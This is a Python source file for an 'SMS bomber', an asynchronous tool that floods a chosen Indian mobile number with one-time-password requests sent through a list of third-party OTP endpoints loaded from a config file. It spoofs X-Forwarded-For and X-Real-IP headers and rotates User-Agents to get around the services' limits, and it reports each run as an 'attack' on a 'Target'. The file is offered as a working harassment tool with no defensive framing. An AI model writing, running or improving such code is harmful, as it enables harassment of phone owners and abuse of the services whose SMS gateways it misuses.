#!/usr/bin/env python3
"""
SMS Bomber Core Module
Async implementation with proper error handling and rate limiting.
Compatible with Python 3.8+
"""

import asyncio
import aiohttp
import random
import secrets
import ssl
import time
import inspect
import logging
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Callable, Any, Tuple
from datetime import datetime

from config import TARGET_ENDPOINTS, USER_AGENTS, DEFAULT_HEADERS, rate_limits, OTPEndpoint

logger = logging.getLogger(__name__)


# ==========================================
# STATS
# ==========================================

@dataclass
class AttackStats:
    """Attack statistics tracker"""
    total: int = 0
    success: int = 0
    failed: int = 0
    start_time: Optional[float] = None
    end_time: Optional[float] = None
    current_endpoint: str = ""
    errors: List[str] = field(default_factory=list)
    target_count: int = 0

    @property
    def duration(self) -> float:
        if not self.start_time:
            return 0.0
        end = self.end_time or time.time()
        return max(0.0, end - self.start_time)

    @property
    def rate(self) -> float:
        d = self.duration
        if d == 0:
            return 0.0
        return self.total / d

    @property
    def progress_pct(self) -> float:
        if self.target_count <= 0:
            return 0.0
        return min(100.0, (self.total / self.target_count) * 100)


# ==========================================
# RATE LIMITER (Token Bucket)
# ==========================================

class RateLimiter:
    def __init__(self, rate: float, burst: int):
        self.rate = rate
        self.burst = burst
        self.tokens = float(burst)
        self.last_update = time.monotonic()
        self._lock = asyncio.Lock()

    async def acquire(self):
        async with self._lock:
            now = time.monotonic()
            elapsed = now - self.last_update
            self.tokens = min(float(self.burst), self.tokens + elapsed * self.rate)
            self.last_update = now

            if self.tokens < 1.0:
                wait_time = (1.0 - self.tokens) / self.rate
                # Release lock while sleeping to avoid blocking others
            else:
                self.tokens -= 1.0
                wait_time = 0.0

        # Sleep outside the lock
        if wait_time > 0:
            await asyncio.sleep(wait_time)
            async with self._lock:
                self.tokens = 0.0


# ==========================================
# PHONE VALIDATION
# ==========================================

def validate_phone(phone: str) -> Tuple[bool, str]:
    """Validate and normalize Indian phone number.
    Returns (is_valid, normalized_number_or_error_message).
    """
    if not phone or not phone.strip():
        return False, "Phone number cannot be empty."

    digits = "".join(filter(str.isdigit, phone.strip()))

    if len(digits) == 10:
        if digits[0] not in "6789":
            return False, "Invalid Indian mobile number (must start with 6, 7, 8, or 9)."
        return True, f"+91{digits}"

    if len(digits) == 12 and digits.startswith("91"):
        if digits[2] not in "6789":
            return False, "Invalid Indian mobile number."
        return True, f"+{digits}"

    if len(digits) == 13 and digits.startswith("091"):
        if digits[3] not in "6789":
            return False, "Invalid Indian mobile number."
        return True, f"+{digits[1:]}"

    return False, "Invalid format. Use: +91XXXXXXXXXX or a 10-digit Indian number."


# ==========================================
# SMS BOMBER
# ==========================================

class SMSBomber:
    """
    Async SMS Bomber with:
    - Connection pooling
    - Per-bomber rate limiting
    - Graceful cancellation
    - Full error handling
    """

    def __init__(
        self,
        phone_number: str,
        count: int,
        progress_callback: Optional[Callable[[AttackStats], Any]] = None,
    ):
        # phone_number MUST already be validated by validate_phone()
        self.phone = phone_number
        self.count = max(1, min(count, rate_limits.MAX_ATTEMPTS_PER_USER))
        self.progress_callback = progress_callback

        self.stats = AttackStats(target_count=self.count)
        self._stop_event = asyncio.Event()
        self._stats_lock = asyncio.Lock()
        self._rate_limiter = RateLimiter(rate=2.0, burst=5)
        self._session: Optional[aiohttp.ClientSession] = None
        self._pending_tasks: List[asyncio.Task] = []

        try:
            self._ssl_context = ssl.create_default_context()
        except Exception:
            self._ssl_context = None  # Fall back — aiohttp will still use default TLS

    # ------------------------------------------
    # Internal helpers
    # ------------------------------------------

    def _format_payload(self, endpoint: OTPEndpoint) -> Dict[str, Any]:
        """Format payload with phone number substitution."""
        phone_clean = self.phone.replace("+", "")
        phone_10 = phone_clean[-10:]

        if not endpoint.payload_template:
            return {endpoint.phone_param: self.phone}

        payload: Dict[str, Any] = {}
        for key, value in endpoint.payload_template.items():
            if isinstance(value, str):
                value = (
                    value
                    .replace("{phone}", self.phone)
                    .replace("{phone_clean}", phone_clean)
                    .replace("{phone_10}", phone_10)
                )
            payload[key] = value
        return payload

    def _get_headers(self, endpoint: OTPEndpoint) -> Dict[str, str]:
        """Build request headers with a random User-Agent and spoofed IP."""
        headers = DEFAULT_HEADERS.copy()
        headers["User-Agent"] = random.choice(USER_AGENTS)

        # Random spoofed forwarding IP
        ip = (
            f"{secrets.randbelow(246) + 10}"
            f".{secrets.randbelow(256)}"
            f".{secrets.randbelow(256)}"
            f".{secrets.randbelow(254) + 1}"
        )
        headers["X-Forwarded-For"] = ip
        headers["X-Real-IP"] = ip

        if endpoint.headers:
            headers.update(endpoint.headers)

        return headers

    async def _update_stats(self, success: bool, endpoint_name: str, error: str = ""):
        async with self._stats_lock:
            self.stats.total += 1
            if success:
                self.stats.success += 1
            else:
                self.stats.failed += 1
                if error and len(self.stats.errors) < 10:
                    self.stats.errors.append(f"{endpoint_name}: {error[:60]}")

    async def _send_otp(self, endpoint: OTPEndpoint) -> bool:
        """Send a single OTP request to one endpoint. Returns True on success."""
        if self._stop_event.is_set():
            return False

        if self._session is None or self._session.closed:
            logger.warning("HTTP session not available, skipping: %s", endpoint.name)
            await self._update_stats(False, endpoint.name, "session unavailable")
            return False

        await self._rate_limiter.acquire()

        if self._stop_event.is_set():
            return False

        async with self._stats_lock:
            self.stats.current_endpoint = endpoint.name

        payload = self._format_payload(endpoint)
        headers = self._get_headers(endpoint)
        is_json = (endpoint.headers or {}).get("Content-Type", "") == "application/json"

        try:
            per_req_timeout = aiohttp.ClientTimeout(total=endpoint.timeout)

            if endpoint.method.upper() == "GET":
                async with self._session.get(
                    endpoint.url,
                    params=payload,
                    headers=headers,
                    timeout=per_req_timeout,
                    ssl=self._ssl_context,
                ) as resp:
                    success = resp.status in (200, 201, 202, 204)
            else:
                async with self._session.post(
                    endpoint.url,
                    json=payload if is_json else None,
                    data=payload if not is_json else None,
                    headers=headers,
                    timeout=per_req_timeout,
                    ssl=self._ssl_context,
                ) as resp:
                    success = resp.status in (200, 201, 202, 204)

            await self._update_stats(success, endpoint.name,
                                     "" if success else f"HTTP {resp.status}")
            return success

        except asyncio.TimeoutError:
            await self._update_stats(False, endpoint.name, "timeout")
            return False

        except aiohttp.ClientError as exc:
            await self._update_stats(False, endpoint.name, str(exc))
            return False

        except asyncio.CancelledError:
            # Task was cancelled — propagate cleanly
            raise

        except Exception as exc:
            logger.error("Unexpected error for %s: %s", endpoint.name, exc, exc_info=True)
            await self._update_stats(False, endpoint.name, "unexpected error")
            return False

    async def _progress_updater(self):
        """Background task: push progress to caller via callback."""
        failure_streak = 0
        while not self._stop_event.is_set():
            # Stop when all requests are done
            async with self._stats_lock:
                done = self.stats.total >= self.count
            if done:
                break

            if self.progress_callback:
                try:
                    result = self.progress_callback(self.stats)
                    # Support both sync and async callbacks
                    if inspect.isawaitable(result):
                        await result
                    failure_streak = 0
                except asyncio.CancelledError:
                    break
                except Exception as exc:
                    failure_streak += 1
                    logger.error("Progress callback error: %s", exc)

            # Adaptive interval: slow down on repeated failures
            if self.count <= 20:
                base = 1.0
            elif self.count <= 100:
                base = 2.0
            else:
                base = 3.0

            interval = min(8.0, base * (2 ** min(failure_streak, 3)))
            try:
                await asyncio.sleep(interval)
            except asyncio.CancelledError:
                break

    # ------------------------------------------
    # Public API
    # ------------------------------------------

    async def start(self) -> AttackStats:
        """Run the full attack. Blocks until complete or stopped."""
        if not TARGET_ENDPOINTS:
            logger.error("No endpoints configured — aborting attack.")
            now = time.time()
            self.stats.start_time = now
            self.stats.end_time = now
            return self.stats

        self.stats.start_time = time.time()
        self._stop_event.clear()
        self._pending_tasks.clear()

        connector = aiohttp.TCPConnector(
            limit=50,
            limit_per_host=5,
            ttl_dns_cache=300,
            use_dns_cache=True,
            enable_cleanup_closed=True,
        )
        session_timeout = aiohttp.ClientTimeout(total=30)

        try:
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=session_timeout,
            ) as self._session:

                progress_task = asyncio.create_task(
                    self._progress_updater(), name="progress_updater"
                )

                endpoints = list(TARGET_ENDPOINTS)

                for i in range(self.count):
                    if self._stop_event.is_set():
                        break
                    endpoint = endpoints[i % len(endpoints)]
                    task = asyncio.create_task(
                        self._send_otp(endpoint),
                        name=f"otp_{i}_{endpoint.name}",
                    )
                    self._pending_tasks.append(task)

                    # Stagger every 10 requests to avoid thundering-herd
                    if i > 0 and i % 10 == 0:
                        await asyncio.sleep(0.1)

                # Wait for all OTP tasks
                if self._pending_tasks:
                    await asyncio.gather(*self._pending_tasks, return_exceptions=True)

                # Signal progress task to stop and wait for it
                self._stop_event.set()
                try:
                    await asyncio.wait_for(progress_task, timeout=3.0)
                except asyncio.TimeoutError:
                    progress_task.cancel()
                    try:
                        await progress_task
                    except (asyncio.CancelledError, Exception):
                        pass

        except asyncio.CancelledError:
            self._stop_event.set()
            logger.info("Attack cancelled for %s", self.phone)
        except Exception as exc:
            logger.error("Unexpected error in start(): %s", exc, exc_info=True)
        finally:
            self.stats.end_time = time.time()
            self._pending_tasks.clear()

        return self.stats

    async def stop(self):
        """Gracefully stop the attack and cancel all pending OTP tasks."""
        self._stop_event.set()
        # Cancel tasks that haven't started yet
        for task in self._pending_tasks:
            if not task.done():
                task.cancel()
        if self._pending_tasks:
            await asyncio.gather(*self._pending_tasks, return_exceptions=True)
        logger.info("Attack stopped for %s", self.phone)

    # ------------------------------------------
    # Display helpers
    # ------------------------------------------

    def get_progress_bar(self, width: int = 20) -> str:
        if self.count == 0:
            return "[" + "░" * width + "] 0%"
        pct = min(100.0, (self.stats.total / self.count) * 100)
        filled = int(width * pct / 100)
        bar = "█" * filled + "░" * (width - filled)
        return f"[{bar}] {pct:.1f}%"

    def format_status(self) -> str:
        return (
            "📊 **Attack Status**\n\n"
            f"{self.get_progress_bar()} ({self.stats.progress_pct:.1f}%)\n\n"
            f"📱 Target: `{self.phone}`\n"
            f"📤 Sent: {self.stats.total}/{self.count}\n"
            f"✅ Success: {self.stats.success}\n"
            f"❌ Failed: {self.stats.failed}\n"
            f"⚡ Rate: {self.stats.rate:.1f} req/s\n"
            f"⏱️ Duration: {self.stats.duration:.1f}s\n"
            f"🌐 Current: {self.stats.current_endpoint or 'Starting...'}"
        )


# ==========================================
# QUICK SELF-TEST
# ==========================================

if __name__ == "__main__":
    async def _test():
        print("Testing validate_phone...")
        for num in ["9876543210", "+919876543210", "919876543210", "091-9876543210", "1234"]:
            ok, result = validate_phone(num)
            print(f"  {num!r:25s} -> valid={ok}, result={result!r}")

        print("\nTesting SMSBomber (3 requests, no real sends)...")
        bomber = SMSBomber("+919876543210", 3)
        stats = await bomber.start()
        print(f"  total={stats.total}, success={stats.success}, failed={stats.failed}")

    asyncio.run(_test())
